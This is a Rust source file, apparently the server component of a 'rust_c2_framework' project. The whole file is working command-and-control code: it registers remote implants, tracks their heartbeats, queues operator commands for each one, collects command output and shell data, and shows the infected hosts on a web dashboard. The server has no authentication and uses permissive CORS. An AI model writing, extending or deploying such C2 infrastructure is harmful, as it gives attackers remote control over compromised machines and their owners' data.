use askama::Template;
use axum::{
    Json, Router,
    extract::{Path, State},
    http::StatusCode,
    response::Html,
    routing::{get, post},
};
use serde::{Deserialize, Serialize};
use serde_json;
use std::collections::HashMap;
use std::net::TcpListener as StdTcpListener;
use std::sync::Arc;
use tokio::net::TcpListener as TokioTcpListener; // Alias Tokio's TcpListener
use tokio::sync::RwLock;
use tower_http::{cors::CorsLayer, services::ServeDir}; // Import Std TcpListener

// 引入common模块
use rust_c2_framework::common::*;

/// 服务器状态
#[derive(Clone)]
pub struct ServerState {
    pub clients: Arc<RwLock<HashMap<String, ClientInfo>>>,
    pub commands: Arc<RwLock<HashMap<String, Vec<CommandRequest>>>>,
    pub command_results: Arc<RwLock<HashMap<String, Vec<CommandResponse>>>>,
    pub shell_sessions: Arc<RwLock<HashMap<String, ShellSession>>>,
}

impl ServerState {
    pub fn new() -> Self {
        Self {
            clients: Arc::new(RwLock::new(HashMap::new())),
            commands: Arc::new(RwLock::new(HashMap::new())),
            command_results: Arc::new(RwLock::new(HashMap::new())),
            shell_sessions: Arc::new(RwLock::new(HashMap::new())),
        }
    }
}

/// Web模板
#[derive(Template)]
#[template(path = "index.html")]
struct IndexTemplate {
    clients: Vec<DisplayClientInfo>,
    online_clients_count: usize,
    os_types_count: usize, // Add this field
}

// New struct to combine ClientInfo with online status for display
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DisplayClientInfo {
    #[serde(flatten)]
    pub client_info: ClientInfo,
    pub is_online: bool,
}

#[derive(Template)]
#[template(path = "client.html")]
struct ClientTemplate {
    client: ClientInfo,
    commands: Vec<CommandResponse>,
}

/// API处理器
/// 客户端注册
async fn register_client(
    State(state): State<ServerState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(client_info) = serde_json::from_slice::<ClientInfo>(&message.payload) {
        let mut clients = state.clients.write().await;
        clients.insert(client_info.id.clone(), client_info);
        println!("Client registered: {}", clients.len());
        Ok(StatusCode::OK)
    } else {
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 心跳处理
async fn handle_heartbeat(
    State(state): State<ServerState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(mut client_info) = serde_json::from_slice::<ClientInfo>(&message.payload) {
        client_info.last_seen = chrono::Utc::now();
        let mut clients = state.clients.write().await;
        clients.insert(client_info.id.clone(), client_info);
        Ok(StatusCode::OK)
    } else {
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 获取客户端命令
async fn get_commands(
    State(state): State<ServerState>,
    Path(client_id): Path<String>,
) -> Result<Json<Vec<CommandRequest>>, StatusCode> {
    let mut commands = state.commands.write().await;
    let client_commands = commands.remove(&client_id).unwrap_or_default();
    Ok(Json(client_commands))
}

/// 接收命令结果
async fn handle_command_result(
    State(state): State<ServerState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(result) = serde_json::from_slice::<CommandResponse>(&message.payload) {
        let mut results = state.command_results.write().await;
        results
            .entry(result.client_id.clone())
            .or_insert_with(Vec::new)
            .push(result);
        Ok(StatusCode::OK)
    } else {
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 处理Shell数据
async fn handle_shell_data(
    State(_state): State<ServerState>, // Fix: unused variable
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    // 这里可以实现Shell数据的处理和转发
    println!("Received shell data: {} bytes", message.payload.len());
    Ok(StatusCode::OK)
}

/// Web界面处理器
/// 主页面
async fn index(State(state): State<ServerState>) -> Result<Html<String>, StatusCode> {
    let clients = state.clients.read().await;
    let current_timestamp = chrono::Utc::now().timestamp();

    let display_clients: Vec<DisplayClientInfo> = clients
        .values()
        .cloned()
        .map(|c| {
            let is_online = (current_timestamp - c.last_seen.timestamp()) < 60;
            DisplayClientInfo {
                client_info: c,
                is_online,
            }
        })
        .collect();

    let online_clients_count = display_clients.iter().filter(|c| c.is_online).count();
    let os_types_count = display_clients
        .iter()
        .map(|c| c.client_info.os.as_str())
        .collect::<std::collections::HashSet<_>>()
        .len();

    let template = IndexTemplate {
        clients: display_clients,
        online_clients_count,
        os_types_count, // Pass the calculated count
    };

    match template.render() {
        Ok(html) => Ok(Html(html)),
        Err(e) => {
            eprintln!("Template rendering error: {:?}", e);
            Err(StatusCode::INTERNAL_SERVER_ERROR)
        }
    }
}

/// 客户端详情页面
async fn client_detail(
    State(state): State<ServerState>,
    Path(client_id): Path<String>,
) -> Result<Html<String>, StatusCode> {
    let clients = state.clients.read().await;
    let command_results = state.command_results.read().await;

    if let Some(client) = clients.get(&client_id) {
        let commands = command_results.get(&client_id).cloned().unwrap_or_default();

        let template = ClientTemplate {
            client: client.clone(),
            commands,
        };

        match template.render() {
            Ok(html) => Ok(Html(html)),
            Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
        }
    } else {
        Err(StatusCode::NOT_FOUND)
    }
}

/// 发送命令到客户端
async fn send_command(
    State(state): State<ServerState>,
    Path(client_id): Path<String>,
    Json(mut cmd): Json<CommandRequest>,
) -> Result<StatusCode, StatusCode> {
    cmd.client_id = client_id.clone();

    let mut commands = state.commands.write().await;
    commands.entry(client_id).or_insert_with(Vec::new).push(cmd);

    Ok(StatusCode::OK)
}

/// 获取客户端列表API
async fn api_clients(State(state): State<ServerState>) -> Json<Vec<ClientInfo>> {
    let clients = state.clients.read().await;
    let clients_vec: Vec<ClientInfo> = clients.values().cloned().collect();
    Json(clients_vec)
}

/// 获取命令结果API
async fn api_command_results(
    State(state): State<ServerState>,
    Path(client_id): Path<String>,
) -> Json<Vec<CommandResponse>> {
    let command_results = state.command_results.read().await;
    let results = command_results.get(&client_id).cloned().unwrap_or_default();
    Json(results)
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let state = ServerState::new();

    // 创建路由
    let app = Router::new()
        // Web界面路由
        .route("/", get(index))
        .route("/client/:id", get(client_detail))
        // API路由
        .route("/api/register", post(register_client))
        .route("/api/heartbeat", post(handle_heartbeat))
        .route("/api/commands/:client_id", get(get_commands))
        .route("/api/command_result", post(handle_command_result))
        .route("/api/shell_data", post(handle_shell_data))
        .route("/api/clients", get(api_clients))
        .route("/api/clients/:client_id/commands", post(send_command))
        .route("/api/clients/:client_id/results", get(api_command_results))
        // 静态文件服务
        .nest_service("/static", ServeDir::new("web/static"))
        .layer(CorsLayer::permissive())
        .with_state(state);

    println!("C2 Server starting on http://0.0.0.0:8080");

    let listener = TokioTcpListener::bind("0.0.0.0:8080").await?;
    let std_listener: StdTcpListener = listener.into_std()?; // Convert to std::net::TcpListener
    std_listener.set_nonblocking(true)?; // Set non-blocking for hyper

    axum::Server::from_tcp(std_listener)?
        .serve(app.into_make_service())
        .await?;

    Ok(())
}
